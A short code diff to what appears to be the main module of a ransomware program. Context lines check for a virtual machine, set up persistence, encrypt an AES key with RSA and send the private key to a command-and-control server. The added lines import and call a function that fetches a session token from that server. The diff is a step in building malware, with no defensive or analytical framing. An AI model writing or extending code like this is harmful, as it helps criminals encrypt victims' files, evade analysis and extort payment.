@@ -6,6 +6,7 @@ from Timer import save_timer_data, watchdog_timer,load_timer_data
 from RSA_Key_Handling import send_private_key_to_c2
 from Persistence import os_check
 from VM_Check import running_in_vm
+from Session_Handling import get_session_token
 
 ####################################################################################################################
 
@@ -41,6 +42,8 @@ else:
     # Encrypt AES key with RSA public key and save it
     encrypted_aes_key = encrypt_aes_key_with_rsa(symmetric_key, public_key)
     save_encrypted_aes_key(encrypted_aes_key)
+
+    get_session_token() # This will get the generate session token from the C2
 
     send_private_key_to_c2(private_key)
 
